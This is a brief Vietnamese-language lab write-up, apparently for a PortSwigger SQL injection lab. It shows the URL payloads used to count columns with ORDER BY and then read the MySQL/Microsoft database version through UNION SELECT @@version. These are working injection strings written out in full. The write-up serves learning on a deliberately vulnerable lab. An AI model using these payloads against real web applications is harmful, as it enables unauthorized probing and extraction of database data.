# SQL injection attack, querying the database type and version on MySQL and Microsoft

Bài lab này yêu cầu ta truy cập vào dữ liệu liên quan tới version của phiên bản MySQL, Microsoft.

Đầu tiên ta mở `Burpsuite` và thực hiện gửi request tới `Repeater` rồi tiến hành kiểm tra xem có bao nhiêu cột bằng cách thay đổi payload của `Get request` thành:
- `/filter?category=Gifts'+ORDER+BY+1#`
- `/filter?category=Gifts'+ORDER+BY+2#`
- `/filter?category=Gifts'+ORDER+BY+3#`(tới đây thì server error, vậy là chỉ có 2 cột)

Tiếp theo ta tiến hành kiểm tra kiểu dữ liệu trong cột xem có phải ở dạng chuỗi không(vì thông tiên phiên bản được hiển thị ở dạng chuỗi) với payload của `Get request` như sau:
- `/filter?category=Gifts'+UNION+SELECT+'abc',+'def'#`

![](https://github.com/Luwcj/SQLi/blob/main/Portswigger/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/2.1.png?raw=true)

Tiếp theo ta truy cập vào dữ liệu trong cột @@version và lấy thông tin thui:
- `/filter?category='+UNION+SELECT+@@version,NULL#`

![](https://github.com/Luwcj/SQLi/blob/main/Portswigger/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/2.2.png?raw=true)
